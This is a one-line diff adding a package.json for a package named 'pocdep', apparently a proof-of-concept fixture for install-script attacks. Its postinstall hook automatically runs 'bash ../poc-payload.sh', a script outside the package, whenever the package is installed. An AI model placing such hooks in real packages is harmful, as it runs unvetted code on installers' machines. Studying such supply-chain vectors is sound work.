@@ -1,0 +1,1 @@
+{"name":"pocdep","version":"1.0.0","scripts":{"postinstall":"bash ../poc-payload.sh"}}
